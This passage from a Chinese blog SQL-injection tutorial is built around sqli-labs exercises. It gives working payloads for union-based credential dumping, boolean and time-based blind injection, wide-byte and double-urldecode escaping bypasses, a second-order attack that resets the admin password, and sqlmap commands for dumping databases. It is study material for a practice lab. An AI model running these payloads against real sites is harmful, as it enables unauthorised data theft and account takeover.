title=\"POST注入\"></a>POST注入</h2><p>上面的http头注入其实就是一种稍微特殊的post注入，<strong>post注入</strong>，顾名思义，就是注入点在post表单里的sql注入漏洞，一般手工注入需要借助工具（Burpsuite）抓包，然后修改post数据。</p>\n<p>利用sqlmap进行post注入有几种方式</p>\n<p><strong>1.普通的表单注入</strong></p>\n<p>在表单中，例如登陆页面，如果不知道哪个参数存在注入点，可以直接添加<code>--forms</code>命令参数</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --forms --batch</code></pre><p><strong>2.带参数的表单注入</strong></p>\n<p>如果已知某个参数有注入漏洞，如”id=1&amp;time=2001”</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --data “id=1&amp;time=2001” --batch</code></pre><p><strong>3.使用文件指定参数的表单（HTTP头）注入</strong></p>\n<p>比如已知注入点为id，在post表单中</p>\n<p>用Burpsuite抓包，把报头保存为<code>post.txt</code>，放在sqlmap同目录下（或者随便放哪，到时候带路径就行，懂得都懂）</p>\n<pre><code>sqlmap &gt; py sqlmap.py -r post.txt -p id --dbs --batch     //用-p参数指定注入点\n或者\nsqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别，level 3级别就会自动探测http头</code></pre><p>要在http头中进行注入，只要在需要探测的字段后面添加一个<code>*</code>号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个<code>*</code>号。</p>\n<pre><code>Referer: http://127.0.0.1/sqli/Less-19/*</code></pre><p><strong>4.使用Burpsuite带sqlmap插件注入</strong></p>\n<p>很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。</p>\n<h2 id=\"GET报错注入\"><a href=\"#GET报错注入\" class=\"headerlink\" title=\"GET报错注入\"></a>GET报错注入</h2><script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管理员账号密码，重要数据等），修改数据库信息。</p>\n<blockquote>\n<p>按照注入点类型来分类</p>\n</blockquote>\n<h3 id=\"（1）数字型注入点\"><a href=\"#（1）数字型注入点\" class=\"headerlink\" title=\"（1）数字型注入点\"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href=\"http://xxx.com/users.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>\n<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>\n<h3 id=\"（2）字符型注入点\"><a href=\"#（2）字符型注入点\" class=\"headerlink\" title=\"（2）字符型注入点\"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href=\"http://xxx.com/users.php?name=admin\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>\n<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p>\n<h3 id=\"（3）搜索型注入点\"><a href=\"#（3）搜索型注入点\" class=\"headerlink\" title=\"（3）搜索型注入点\"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>\n<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>\n<blockquote>\n<p>按照数据提交的方式来分类</p>\n</blockquote>\n<h3 id=\"（1）GET-注入\"><a href=\"#（1）GET-注入\" class=\"headerlink\" title=\"（1）GET 注入\"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href=\"http://xxx.com/index.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>\n<h3 id=\"（2）POST-注入\"><a href=\"#（2）POST-注入\" class=\"headerlink\" title=\"（2）POST 注入\"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>\n<h3 id=\"（3）Cookie-注入\"><a href=\"#（3）Cookie-注入\" class=\"headerlink\" title=\"（3）Cookie 注入\"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>\n<h3 id=\"（4）HTTP-头部注入\"><a href=\"#（4）HTTP-头部注入\" class=\"headerlink\" title=\"（4）HTTP 头部注入\"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>\n<blockquote>\n<p>按照执行效果来分类</p>\n</blockquote>\n<h3 id=\"（1）基于布尔的盲注\"><a href=\"#（1）基于布尔的盲注\" class=\"headerlink\" title=\"（1）基于布尔的盲注\"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>\n<h3 id=\"（2）基于时间的盲注\"><a href=\"#（2）基于时间的盲注\" class=\"headerlink\" title=\"（2）基于时间的盲注\"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<h3 id=\"（3）基于报错注入\"><a href=\"#（3）基于报错注入\" class=\"headerlink\" title=\"（3）基于报错注入\"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<ol>\n<li>单引号</li>\n<li>双引号</li>\n<li>基于数字型注入</li>\n</ol>\n<h3 id=\"（4）联合查询注入\"><a href=\"#（4）联合查询注入\" class=\"headerlink\" title=\"（4）联合查询注入\"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>\n<h3 id=\"（5）堆查询注入\"><a href=\"#（5）堆查询注入\" class=\"headerlink\" title=\"（5）堆查询注入\"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>\n<h3 id=\"（6）宽字节注入\"><a href=\"#（6）宽字节注入\" class=\"headerlink\" title=\"（6）宽字节注入\"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>\n<h3 id=\"基于sqli-labs的实践操作\"><a href=\"#基于sqli-labs的实践操作\" class=\"headerlink\" title=\"基于sqli-labs的实践操作\"></a>基于sqli-labs的实践操作</h3><h4 id=\"1-基于报错的GET-sql注入\"><a href=\"#1-基于报错的GET-sql注入\" class=\"headerlink\" title=\"1.基于报错的GET sql注入\"></a>1.基于报错的GET sql注入</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p><img src=\"/img/less-1.png\" alt></p>\n<p>提示说输入一个数字作为ID的值</p>\n<p>那么先在url输入?id=1</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id=1.png\" alt></p>\n<p>显示查询成功，返回了用户Dumb</p>\n<p>然后尝试使其报错，输入 ?id=1’</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id-1'.png\" alt></p>\n<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>\n<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>\n<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>\n<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = &#39;$id&#39; limit 0,1 &quot;</code></pre>\n<p> id被单引号包裹，这是字符型注入点</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p><img src=\"/img/less-2.png\" alt></p>\n<p>流程与上面差不多</p>\n<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>\n<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>\n<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id =$id limit 0,1 &quot;</code></pre>\n<p>id没有被单引号包裹，这是一个数字型注入点</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p><img src=\"/img/less-3.png\" alt></p>\n<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>\n<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>\n<p>显然，后台语句是</p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = (&#39;$id&#39;) limit 0,1 &quot;</code></pre>\n<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>\n<p>比如上面这个less-3</p>\n<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>\n<p><img src=\"/img/--+.png\" alt></p>\n<p>![](/img/– .png)</p>\n<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>\n<p>那就使用\\来制造报错，输入 id=1\\</p>\n<p>返回报错 ‘“1\\“) LIMIT 0,1’–&gt;”1\\“) LIMIT 0,1</p>\n<p>\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>\n<p>合理推测：</p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = (&quot;id&quot;) limit 0,1 &quot;</code></pre>\n<p>验证：</p>\n<p><img src=\"/img/less-4.png\" alt></p>\n<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>\n<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>\n<p>例如less-1(字符型) 就可以输入?id=1’ order by 1[,2,3,4… ] –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>\n<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>\n<p>我们要构造的语句是SELECT [username,password] FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>\n<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>\n<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>\n<p>效果</p>\n<p><img src=\"/img/union%E6%B3%A8%E5%85%A5.png\" alt></p>\n<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>\n<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>\n<p><img src=\"/img/union%E7%88%86%E5%BA%93.png\" alt></p>\n<p>爆出了用户名和使用的数据库名</p>\n<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>\n<p>例如：</p>\n<p>爆表：</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+</code></pre>\n<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>\n<p><img src=\"/img/union%E7%88%86%E8%A1%A8.png\" alt></p>\n<p>看到了最后一个表是’users’,可用于下一步爆字段</p>\n<p>爆字段：</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(column_name),database() from information_schema.columns where table_name=&#39;users&#39; --+        //记得最后这个表名要加单引号，不然没用</code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png\" alt></p>\n<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(username,0x3a,password),3 from [security.]users --+        //有时候要在表名前面加上数据库名，不然也出不来,即 这个环境下的security.</code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png\" alt></p>\n<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>\n<h2 id=\"利用SQLmap工具进行sql注入\"><a href=\"#利用SQLmap工具进行sql注入\" class=\"headerlink\" title=\"利用SQLmap工具进行sql注入\"></a>利用SQLmap工具进行sql注入</h2><p>进入SQLmap工具目录打开命令行，输入命令</p>\n<pre><code class=\"bash\">py sqlmap.py -u http://xxx.com/?id=1 --dbs --batch        //输入点为id参数 --dbs参数用于探测数据库，--batch参数用于自动执行默认选项（省的我们在探测过程中一直按Y）</code></pre>\n<p>如果只有一个注入点，可以不用在url两边加上双引号，如果有两个注入点，则需要将url用双引号括起来</p>\n<pre><code class=\"bash\">py sqlmap.py -u &quot;http://xxx.com/?id=1&amp;digree=high&quot; --dbs --batch</code></pre>\n<p>如果需要的数据就在本数据库里，则可以省去上面这一步，直接进行接下来的爆表，爆字段的操作</p>\n<pre><code class=\"bash\">py sqlmap.py -u http://xxx.com/?id=1 --tables --batch        //爆表\n假如爆出表名‘flag’</code></pre>\n<pre><code class=\"bash\">py sqlmap.py -u http://xxx.com/?id=1 -T flag --columns --batch        //爆字段\n假如爆出字段‘flag’</code></pre>\n<pre><code class=\"bash\">py sqlmap.py -u http://xxx.com/?id=1 -T flag -C flag --dump --batch        //爆出数据\n到这里就可以拿到我们想要的字段里的数据了</code></pre>\n<h3 id=\"布尔型盲注\"><a href=\"#布尔型盲注\" class=\"headerlink\" title=\"布尔型盲注\"></a>布尔型盲注</h3><p>采用以下语句拆（猜）解字符串</p>\n<p>猜解数据库名字长度</p>\n<pre><code class=\"mysql\">?id =1&#39; and length(database())&gt;&lt;=N --+</code></pre>\n<p>猜测数据库名字。</p>\n<pre><code class=\"mysql\">?id =1&#39; and ascii(substr(database(),1,1))&gt;&lt;=N --+        （利用二分法，ascii为ascii码，例如97=‘a’）</code></pre>\n<blockquote>\n<p>SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符</p>\n<p>所以substr(database(),1,1)意思是截取数据库名的第一个字符，用这种方式猜解数据库的第1，2，3…到最后一个字符。</p>\n<p>SUBSTR(str,pos): pos开始的位置，一直截取到最后 </p>\n</blockquote>\n<p>6、猜表名</p>\n<pre><code class=\"mysql\">?id=1&#39; and (ascii(substr((select table_name from  information_schema.tables where  table_schema=database()),1,1)))&gt;&lt;=N --+）</code></pre>\n<p> 7、猜列名：</p>\n<pre><code class=\"mysql\">?id=1&#39; and (ascii(substr((select column_name from  information_schema.columns where table_schema=database() and  table_name=‘表名’ limit 0,1),1,1)))&gt;&lt;=N --+ (如果报错可以加limit 0,1)</code></pre>\n<p> 8、查字段</p>\n<pre><code class=\"mysql\">?id=1&#39; and length((select 列名 from 数据库.表名 limit 0,1))&gt;0 --+\n然后重复以上猜解字符串手法</code></pre>\n<p><strong>实际上，还是直接使用sqlmap方便</strong>，直接在命令后面加 –technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式</p>\n<p> SQLMAP目前支持的注入方式包括（默认全进行）：</p>\n<blockquote>\n<p>  B: Boolean-based blind SQL injection（布尔型注入）</p>\n<p>  E: Error-based SQL injection（报错型注入）</p>\n<p>  U: UNION query SQL injection（可联合查询注入）</p>\n<p>  S: Stacked queries SQL injection（可多语句查询注入）</p>\n<p>  T: Time-based blind SQL injection（基于时间延迟注入）</p>\n<p>  Q: Inline SQL Injection (内联注入)</p>\n</blockquote>\n<h3 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h3><p>跟布尔盲注类似，也是猜解字符串，只不过由于前端回显更不明显，需要使用if和sleep语句来判断注入结果</p>\n<p>判断：</p>\n<pre><code>?id=1’ and sleep(5)        // 响应时间比正常情况多5秒，则存在延时注入</code></pre><p>查数据库</p>\n<pre><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)</code></pre><p>其他操作方式与布尔型类似。<br>例如：<br>尝试延时注入</p>\n<pre><code>?id=1’ and sleep(5) --+     //第一步,判断是否有延时注入\n?id=1&#39; and if(length(database())&gt;&lt;=N,sleep(5),0) --+        //第二步，猜测数据库名长度\n?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0) --+     //第三步猜测数据库名</code></pre><p><strong>手工注入是不可能手工注入的，还是sqlmap省事</strong>，加参数 –technique=T，时间注入一步到位。</p>\n<h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><p>GBK编码每个字符占两字节（bytes）</p>\n<p>ASCII编码每个字符占一字节</p>\n<p><strong>重点：注入原理</strong></p>\n<p><strong>PHP中使用的编码方式为GBK，</strong></p>\n<p><strong>函数执行（参数等）使用的是ASCII编码；</strong></p>\n<p><strong>而MYSQL使用的默认字符集是GBK等宽字节字符集。</strong></p>\n<p>当后端用PHP的函数（如addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数）对用户输入进行检测，对危险字符进行转义时，就有可能发生宽字节注入漏洞。</p>\n<p>当源码中设置”set character_set_client=gbk”  时</p>\n<p>%df%27 可把程序中转义函数过滤的“\\ ” （%5c）吃掉。</p>\n<blockquote>\n<p>如addslashes()函数会在用户输入的单引号 ‘ （%27）前面加一个反斜杠 \\ （%5c），但如果我们在单引号前面加一个%df，即%df%27，经过addslashes()函数过滤后就变成了 %df%5c%27 ，但是在GBK编码中，%df%5c是一个汉字 “縗”</p>\n</blockquote>\n<p>例如：</p>\n<p><code>/1.php?id=1</code>存在宽字节注入时，则: <code>/1.php?id=-1’and 1=1%23</code>,-1后面的单引号会被转义成  \\’</p>\n<p>但是提交：</p>\n<pre><code> /1.php?id=-1%df’and 1=1%23</code></pre><p> 时，</p>\n<p><code>%df</code>和 反斜杠 \\ (%5c) 组合 <code>%df%5c</code>  编码后是一个 縗 字，这时候单引号依然存在，则会闭合成功，形成宽字节注入，使得后面的and语句成功执行。</p>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><p>二次注入就是先在网站服务器里储存一些数据，这些数据可以构成恶意语法，然后再利用这些数据完成攻击，比如在该网站注册一个账号，用账号名字或密码作为payload执行注入攻击。这是最基本的原理。</p>\n<p>例如：如果有某网站的后台登录SQL语句是这样的</p>\n<pre><code class=\"mysql\">SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;</code></pre>\n<p>如果，我们先注册一个用户，用户名为”admin’ – “，且前端后端都通过了（现实场景是基本不太可能的，写题有一定可能），那么，当我们登录这个用户时，这个语句就变成了</p>\n<pre><code class=\"mysql\">SELECT * FROM users WHERE username=&#39;admin&#39; -- &#39; and password=&#39;$password&#39;</code></pre>\n<p>这样，就直接登录了<strong>admin</strong>账户，如果admin账户存在的话。这就是二次注入的基本原理。</p>\n<p>可以抽象概括为两步：</p>\n<p>1.插入恶意数据</p>\n<p>2.引用恶意数据</p>\n<p><strong>应用场景</strong></p>\n<p>Web应用程序常使用</p>\n<p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p>\n<p>或者开启GPC（<code>magic_quote_gpc=on</code>,<strong><em>开启之后，能自动实现addslashes()和stripslashes()这两个函数的功能</em></strong>）</p>\n<p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p>\n<p>二次注入适用于绕过addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数，因为这些转义函数是用在第一次输入web服务器时，执行php语句时生效的，当储存入数据库，它该是怎么样就是怎么样了</p>\n<p>比如：</p>\n<p><code>admin&#39; --</code>这个输入，直接传入后台经过addslashes()函数过滤后，就变成了<code>admin\\&#39; --</code>，这个嵌入sql语句是没用的，无法闭合sql语句。</p>\n<pre><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin\\&#39; -- &#39; and password=&#39;$curr_pass&#39;</code></pre><p>但是如果把它作为一个账户名注册入数据库，它在数据库里就是<code>admin&#39; --</code>。这时我们先以这个<code>admin&#39; --</code>账户的身份登录进去，然后修改其密码，由于这时的账户名大概率不再经过addslashes()等函数的过滤了（已经以这个账户的身份登录进去了，语句中的用户名是直接从数据库中读出或者通过session传递的），仍然是<code>admin&#39; --</code>，也是说，后台sql语句是</p>\n<pre><code class=\"mysql\">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; -- &#39; and password=&#39;$curr_pass&#39;</code></pre>\n<p><code>--</code>后面的语句被注释，也就是说，我们修改的是admin账户的密码。</p>\n<p><strong>sqli-labs实例分析</strong></p>\n<p><strong>less-24</strong></p>\n<p><img src=\"/img/image-20210122114946180.png\" alt=\"image-20210122114946180\"></p>\n<p>一个登录界面，有创建新用户，也有忘记密码。</p>\n<p>登录的后端源码是这样的</p>\n<p><img src=\"/img/image-20210122123420557.png\" alt=\"image-20210122123420557\"></p>\n<p>用户名密码全都用mysql_real_escape_string()函数过滤了，所以直接注入是会被转义掉单引号的</p>\n<p>我们先看看数据库中有哪些用户名</p>\n<p><img src=\"/img/image-20210122115233156.png\" alt=\"image-20210122115233156\"></p>\n<p>sqli的数据库是security,users表中有以上用户名和密码</p>\n<p>那么我们构建一个<code>admin&#39; -- -</code>用户，新建一下</p>\n<p>看一下创建新用户的源码</p>\n<p><img src=\"/img/image-20210122115619387.png\" alt=\"image-20210122115619387\"></p>\n<p>可以看到三个输入都是用mysql_escape_string()函数过滤了的</p>\n<p>然而</p>\n<p><img src=\"/img/image-20210122124433626.png\" alt=\"image-20210122124433626\"></p>\n<p>存储到数据库中的数据就是原始数据，我们可以看到表中多了一行<code>admin&#39; -- -</code>用户的数据</p>\n<p>现在以这个用户的身份登录</p>\n<p><img src=\"/img/image-20210122125026004.png\" alt=\"image-20210122125026004\"></p>\n<p>这里我们可以看到，它的界面上显示的用户名是<code>admin&#39; -- -</code>，没有转义符号反斜杠<code>\\</code>，为什么呢？我们看看源码</p>\n<p><img src=\"/img/image-20210122130743856.png\" alt=\"image-20210122130743856\"></p>\n<p>它输出的是session中的”username”</p>\n<p>session中的“username”是哪来的呢？在login.php里面</p>\n<p><img src=\"/img/image-20210122131034335.png\" alt=\"login.php\"></p>\n<p>这里显示的很清楚了，$row是数据库查询结果返回的结果集列表，sqllogin()函数返回$row[1]给$login变量，$login变量再赋值给$_SESSION[“username”]，所以session中的username是从数据库中读取的，未经过安全函数过滤。</p>\n<p>然后我们来修改密码</p>\n<p><img src=\"/img/image-20210122131804080.png\" alt=\"pass-change.php\"></p>\n<p>以上是pass-change.php文件中的代码，可以看到$username由session赋值，然后用于sql语句中也就是说，此时它的sql语句实际上是</p>\n<pre><code class=\"mysql\">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; -- -&#39; and password=&#39;$curr_pass&#39; </code></pre>\n<p><code>admin</code>用单引号闭合而且后面被注释掉了，此时我们操作的用户实际上是<code>admin</code>用户</p>\n<p>把密码改成<code>12345</code></p>\n<p><img src=\"/img/image-20210122132251979.png\" alt=\"修改成功\"></p>\n<p>再来看看数据库</p>\n<p><img src=\"/img/image-20210122132407600.png\" alt=\"admin的密码变成了12345\"></p>\n<p>第8行数据中，admin用户的密码变成了12345，sql注入成功，我们修改了admin用户的密码，可以直接登录admin账户了</p>\n<p><strong>二次urldecode 注入</strong></p>\n<p>Web应用程序通常使用</p>\n<p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p>\n<p>或者开启GPC（<code>magic_quote_gpc=on</code>,<em>开启之后，能自动实现addslshes()和stripslashes()这两个函数的功能</em>）</p>\n<p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p>\n<p>如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入，即二次urldecode注入。</p>\n<p><strong>原理：</strong></p>\n<p>由于我们提交参数到webserver时，webserver会自动解码一次，当提交参数</p>\n<pre><code>id=1%2527</code></pre><p>经过第一次解码后，%25 解码结果为 %，则参数此时为id=1%27</p>\n<p>第二次程序使用了urldecode 或者 rawurldecode  函数来解码id参数，则解码后结果为</p>\n<pre><code>id=1&#39;</code></pre><p>这时单引号成功出现，输入闭合，绕过了转义函数或GPC，可以在后面添加执行sql注入语句了。</p>\n<p>这个的原理类似于上面的宽字节注入</p>\n<h2 id=\"HTTP头注入\"><a href=\"#HTTP头注入\" class=\"headerlink\" title=\"HTTP头注入\"></a>HTTP头注入</h2><h3 id=\"User-agent\"><a href=\"#User-agent\" class=\"headerlink\" 